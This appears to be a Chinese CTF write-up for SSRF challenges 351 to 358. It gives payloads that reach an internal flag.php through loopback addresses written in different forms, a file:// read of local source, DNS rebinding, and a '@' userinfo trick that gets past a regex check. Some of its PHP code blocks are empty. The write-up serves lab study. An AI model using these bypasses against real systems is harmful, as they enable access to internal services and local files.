351
payload:
post: url=http://127.0.0.1/flag.php
或者使用 file 伪协议去读取文件
post: url=file:///var/www/html/index.php 查看源码


352
url=http://localhost/flag.php
url=http://127.1/flag.php
都可以拿到 flag

353
127.0.0.1
十进制整数：url=http://2130706433/flag.php
十六进制：url=http://0x7F.0.0.1/flag.php
八进制：url=http://0177.0.0.1/flag.php
十六进制整数：url=http://0x7F000001/flag.php

其他方法

缺省模式：127.0.0.1写成127.1
CIDR：url=http://127.127.127.127/flag.php
url=http://0/flag.php
url=http://0.0.0.0/flag.php

354


355
http://127.1/flag.php


356
要求长度小于3
payload:http://0/flag.php
0在linux系统中会解析成127.0.0.1在windows中解析成0.0.0.0


357
```php

```
gethostbyname — 返回主机名对应的 IPv4地址
DNS Rebinding
> 在网页浏览过程中，用户在地址栏中输入包含域名的网址。浏览器通过DNS服务器将域名解析为IP地址，然后向对应的IP地址请求资源，最后展现给用户。而对于域名所有者，他可以设置域名所对应的IP地址。当用户第一次访问，解析域名获取一个IP地址；然后，域名持有者修改对应的IP地址；用户再次请求该域名，就会获取一个新的IP地址。对于浏览器来说，整个过程访问的都是同一域名，所以认为是安全的。这就造成了DNS Rebinding攻击。

358

正则表达式的意思是以http://ctf.开头，以show结尾。
payload:http://ctf.@127.0.0.1/flag.php?show